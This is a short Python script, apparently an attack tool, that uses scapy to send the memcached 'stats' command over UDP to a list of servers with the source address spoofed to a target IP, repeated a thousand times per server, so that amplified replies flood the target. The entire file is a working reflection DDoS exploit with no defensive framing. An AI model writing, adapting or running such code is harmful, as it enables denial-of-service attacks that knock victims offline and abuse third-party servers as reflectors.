#!/usr/bin/env python
#--*-- coding:utf-8 --*--
#__author__ = 'Kios'

'''
Simple Exploit of Memcache Udp ddos
'''

from scapy.all import *

def Exploit(targetip, MemcacheServerList, count):
    udp_data = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    for eachip in MemcacheServerList:
        pkt = IP(src=targetip,dst=eachip)/UDP(sport=12345, dport=11211)/udp_data
        send(pkt, inter=1, count=count)

if __name__ == '__main__':
    targetServer = '192.168.1.1'
    with open("memcacheiplist.txt", 'r') as f:
        for each in f.readlines():
            Exploit(targetServer, each, 1000)

    f.close()

